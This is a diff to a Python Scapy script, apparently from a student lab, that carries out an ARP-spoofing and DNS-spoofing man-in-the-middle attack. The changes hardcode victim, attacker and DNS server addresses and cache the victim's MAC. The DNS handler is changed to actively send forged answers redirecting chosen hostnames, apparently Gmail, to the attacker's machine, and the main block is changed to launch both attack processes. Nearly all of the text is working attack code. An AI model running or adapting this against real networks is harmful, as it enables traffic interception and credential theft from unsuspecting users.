@@ -5,12 +5,12 @@ from scapy.layers.dns import DNS, DNSQR, DNSRR, IP, sr1, UDP
 import scapy.all as scapy
 import time
 
-DOOFENSHMIRTZ_IP = "192.168.1.178"  # Enter the computer you attack's IP.
-SECRATERY_IP = "127.0.0.1"  # Enter the attacker's IP.
-NETWORK_DNS_SERVER_IP = "192.168.1.27"  # "10.0.2.43"  # Enter the network's DNS server's IP.
+DOOFENSHMIRTZ_IP = "10.0.2.4"  # Enter the computer you attack's IP.
+SECRATERY_IP = "10.0.2.15"  # Enter the attacker's IP.  # todo: should be 127.0.0.1?
+NETWORK_DNS_SERVER_IP = "10.0.2.43"  # Enter the network's DNS server's IP.
 SPOOF_SLEEP_TIME = 2
 
-IFACE = "???"  # Enter the network interface you work on.
+IFACE = "enp0s3"  # Enter the network interface you work on. # todo: how to find it?
 
 FAKE_GMAIL_IP = SECRATERY_IP  # The ip on which we run
 DNS_FILTER = f"udp port 53 and ip src {DOOFENSHMIRTZ_IP} and ip dst {NETWORK_DNS_SERVER_IP}"  # Scapy filter
@@ -50,11 +50,12 @@ class ArpSpoofer(object):
         If not initialized yet, sends an ARP request to the target and waits for a response.
         @return the mac address of the target.
         """
-        arp_request = scapy.ARP(pdst=self.target_ip)
-        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-        arp_request_broadcast = broadcast / arp_request
-        answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
-        self.target_mac = answered_list[0][1].hwsrc
+        if not self.target_mac:
+            arp_request = scapy.ARP(pdst=self.target_ip)
+            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+            arp_request_broadcast = broadcast / arp_request
+            answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
+            self.target_mac = answered_list[0][1].hwsrc
         return self.target_mac
 
     def spoof(self) -> None:
@@ -159,12 +160,19 @@ class DnsHandler(object):
         @param pkt DNS request from target.
         @return string describing the choice made
         """
+        chosen = None
         if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0:  # todo: check what doet it mean
             host_name = pkt["DNS Question Record"].qname
+            pkt = None
             if host_name in self.spoof_dict:
-                return self.get_spoofed_dns_response(pkt, self.spoof_dict[host_name])
+                pkt = self.get_spoofed_dns_response(pkt, self.spoof_dict[host_name])
+                chosen = "Spoofed"
             else:
-                return self.get_real_dns_response(pkt)
+                pkt = self.get_real_dns_response(pkt)
+                chosen = "Real"
+            scapy.send(pkt, verbose=0, iface=IFACE)
+        print("resolve_packet output", chosen)
+        return chosen
 
     def run(self) -> None:
         """
@@ -183,6 +191,7 @@ class DnsHandler(object):
         """
         Starts the DNS server process.
         """
+        print("----------starts DNS server-------------")
         p = mp.Process(target=self.run)
         self.process = p
         self.process.start()
@@ -191,11 +200,8 @@ class DnsHandler(object):
 if __name__ == "__main__":
     plist = []
     spoofer = ArpSpoofer(plist, DOOFENSHMIRTZ_IP, NETWORK_DNS_SERVER_IP)
-    spoofer.get_target_mac()
-    spoofer.run()
-    print(spoofer.target_mac)
-    # server = DnsHandler(plist, SPOOF_DICT)
-    #
-    # print("Starting sub-processes...")
-    # server.start()
-    # spoofer.start()
+    server = DnsHandler(plist, SPOOF_DICT)
+
+    print("Starting sub-processes...")
+    server.start()
+    spoofer.start()
